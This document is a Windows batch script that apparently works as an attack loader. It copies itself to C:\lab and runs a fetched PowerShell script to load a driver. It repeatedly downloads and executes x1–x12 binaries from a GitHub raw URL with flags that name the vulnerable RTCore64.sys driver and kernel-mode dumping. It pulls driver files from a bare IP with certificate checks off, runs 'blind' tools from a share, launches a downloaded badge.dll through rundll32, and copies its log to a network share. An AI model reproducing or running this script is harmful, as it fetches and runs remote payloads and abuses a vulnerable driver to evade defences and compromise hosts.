@echo off
title GO3
setlocal enabledelayedexpansion
set K=\\host.lan\Data
set G=https://raw.githubusercontent.com/josimayktrindade-lgtm/updates/main
set L=https://80.78.22.208
set D=C:\ProgramData\wupd
set C=C:\lab
set O=%C%\GO3.log
set DRV=C:\Windows\System32\RTCore64.sys
set FLAGS=dump --kernelmode --usermode --internet --no-restore --dont-unload-driver --process-name _nada_.exe --vuln-service WupdSvc --vuln-driver %DRV%

if /i not "%~dp0"=="%C%\" (
  if not exist %C% mkdir %C% >nul 2>&1
  copy /y "%~f0" %C%\GO3.bat >nul 2>&1
  if exist %C%\GO3.bat ( start "" /d "%C%" %C%\GO3.bat & exit /b )
)

echo ================ GO3 %date% %time% ================ > %O%
whoami >> %O% 2>&1

echo [1] driver... >> %O%
sc query WupdSvc | findstr RUNNING >nul 2>&1
if errorlevel 1 (
  sc delete WupdSvc >> %O% 2>&1
  sc delete wupd >> %O% 2>&1
  if not exist %D% mkdir %D% >nul 2>&1
  call :fetch %D%\t1p7.ps1 t1p7.ps1 3000
  powershell -NoProfile -ExecutionPolicy Bypass -File %D%\t1p7.ps1 >nul 2>&1
)
findstr /c:LOADED /c:CARREGADO %D%\t1p7.log >> %O% 2>&1

set SUC=0
echo [2] batalha x1..x12 (3 passes, exec colado) >> %O%
for /L %%N in (1,1,12) do (
  if !SUC!==0 (
    for /L %%P in (1,1,3) do (
      if !SUC!==0 (
        echo == x%%N p%%P >> %O%
        curl.exe -k -s --max-time 25 -o %D%\x%%N.exe "%G%/x%%N.exe?cb=%RANDOM%" & %D%\x%%N.exe %FLAGS% > %C%\sh.txt 2>&1
        set RC=!errorlevel!
        set SZ=0
        for %%A in (%C%\sh.txt) do set SZ=%%~zA
        set XF=0
        if exist %D%\x%%N.exe for %%A in (%D%\x%%N.exe) do set XF=%%~zA
        echo   x%%N p%%P rc=!RC! bytes=!SZ! exe=!XF! >> %O%
        if !SZ! gtr 500 set SUC=1
        if !SZ! gtr 500 echo   *** CEGO no x%%N *** >> %O%
        if !SZ! gtr 500 goto :pos
        ping -n 16 127.0.0.1 >nul
      )
    )
  )
)
echo [2b] extras (share shushx/shushf, v67) >> %O%
if !SUC!==0 (
  curl.exe -k -s --max-time 20 -o %DRV% %L%/d3.sys
  "%K%\blind\shushx.exe" %FLAGS% > %C%\sh.txt 2>&1
  set RC=!errorlevel!
  set SZ=0
  for %%A in (%C%\sh.txt) do set SZ=%%~zA
  echo   extra shushx rc=!RC! bytes=!SZ! >> %O%
  if !SZ! gtr 500 set SUC=1
  if !SZ! gtr 500 echo   *** CEGO no shushx(share) *** >> %O%
)
if !SUC!==0 (
  curl.exe -k -s --max-time 20 -o %DRV% %L%/d3.sys
  "%K%\blind\shushf.exe" %FLAGS% > %C%\sh.txt 2>&1
  set RC=!errorlevel!
  set SZ=0
  for %%A in (%C%\sh.txt) do set SZ=%%~zA
  echo   extra shushf rc=!RC! bytes=!SZ! >> %O%
  if !SZ! gtr 500 set SUC=1
  if !SZ! gtr 500 echo   *** CEGO no shushf(share) *** >> %O%
)
if !SUC!==0 (
  echo == v67 >> %O%
  curl.exe -k -s --max-time 20 -o %DRV% %L%/d3.sys
  %D%\v67.exe %FLAGS% > %C%\sh.txt 2>&1
  set RC=!errorlevel!
  set SZ=0
  for %%A in (%C%\sh.txt) do set SZ=%%~zA
  echo   v67 rc=!RC! bytes=!SZ! >> %O%
  if !SZ! gtr 500 set SUC=1
)
:pos
echo [3] SUC=!SUC! >> %O%
echo [4] badge (sempre tenta) >> %O%
call :fetch %C%\badge.dll badge.dll 100000
for %%A in (%C%\badge.dll) do echo badge_bytes=%%~zA >> %O%
if exist %C%\badge.dll (
  rundll32.exe %C%\badge.dll,main
  echo rundll disparado >> %O%
  ping -n 6 127.0.0.1 >nul
  tasklist | findstr /i rundll >> %O%
)
copy /y %O% %K%\GO3.log >nul 2>&1
echo ================ FIM (log %O% + share) ================
pause
exit /b

:fetch
set F=0
if exist %1 for %%A in (%1) do set F=%%~zA
if !F! GEQ %3 exit /b 0
curl.exe -k -s --max-time 30 -o %1 "%G%/%2?cb=%RANDOM%"
set F=0
if exist %1 for %%A in (%1) do set F=%%~zA
if !F! GEQ %3 exit /b 0
curl.exe -k -s --max-time 30 -o %1 "%L%/%2"
set F=0
if exist %1 for %%A in (%1) do set F=%%~zA
if !F! GEQ %3 exit /b 0
exit /b 1
